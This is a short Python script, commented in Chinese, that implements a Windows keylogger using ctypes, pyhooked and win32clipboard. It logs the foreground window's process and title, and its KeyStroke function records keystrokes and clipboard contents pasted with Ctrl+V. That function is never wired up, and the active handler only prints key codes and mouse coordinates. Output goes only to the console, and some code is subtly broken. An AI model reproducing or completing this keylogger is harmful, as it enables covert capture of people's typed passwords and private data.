from ctypes import *
import pythoncom
import pyhooked
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#
def get_current_process():

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("x00".encode('utf8'),size=521)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("x00".encode('utf8'),size=521)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    # 打印
    print("[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value))

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def KeyStroke(event):

    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        print(chr(event.Ascii))
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE]-%s" % (pasted_value))
        else:
            print ("[%s]" % event.Key)
    # 循环监听下一个击键事件
    return True

from pyhooked import Hook, KeyboardEvent, MouseEvent

get_current_process()
def handle_events(args):
    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    # if args.WindowName != current_window:
    #     current_window = args.WindowName
    #     # 函数调用
    #     get_current_process()

    if isinstance(args, KeyboardEvent):
        print(args.key_code)
        if args.current_key == 'A' and args.event_type == 'key down' and 'Lcontrol' in args.pressed_key:
            print("Ctrl + A was pressed")
        elif args.current_key == 'Q' and args.event_type == 'key down' and 'Lcontrol' in args.pressed_key:
            hk.stop()
            print('Quitting.')

    if isinstance(args, MouseEvent):
        print(args.mouse_x)
        if args.mouse_x == 300 and args.mouse_y == 400:
            print("Mouse is at (300,400")


hk = Hook()  # make a new instance of PyHooked
hk.handler = handle_events  # add a new shortcut ctrl+a, or triggered on mouseover of (300,400)
hk.hook()

pythoncom.PumpMessages()